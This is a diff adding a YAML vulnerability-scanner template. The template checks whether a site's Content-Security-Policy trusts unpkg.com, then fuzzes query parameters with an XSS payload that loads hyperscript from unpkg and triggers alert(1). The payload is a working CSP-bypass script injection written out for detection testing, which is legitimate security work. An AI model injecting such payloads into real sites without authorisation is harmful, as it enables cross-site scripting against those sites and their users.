@@ -1,0 +1,45 @@
+flow: http(1) && headless(1)
+headless:
+- fuzzing:
+  - fuzz:
+    - '{{url_encode(injection)}}'
+    mode: single
+    part: query
+    type: replace
+  matchers:
+  - dsl:
+    - unpkg_hyperscript_csp_xss == true
+    type: dsl
+  payloads:
+    injection:
+    - <script src="https://unpkg.com/hyperscript.org"></script><x _="on load alert(1)">
+  steps:
+  - action: navigate
+    args:
+      url: '{{BaseURL}}'
+  - action: waitdialog
+    args:
+      max-duration: 5s
+    name: unpkg_hyperscript_csp_xss
+http:
+- matchers:
+  - condition: and
+    internal: true
+    part: header
+    type: word
+    words:
+    - Content-Security-Policy
+    - unpkg.com
+  method: GET
+  path:
+  - '{{BaseURL}}'
+id: unpkg-hyperscript-csp-bypass
+info:
+  author: renniepak,DhiyaneshDK
+  metadata:
+    verified: true
+  name: Content-Security-Policy Bypass - Unpkg Hyperscript
+  reference:
+  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  severity: medium
+  tags: xss,csp-bypass,unpkg-hyperscript,vuln
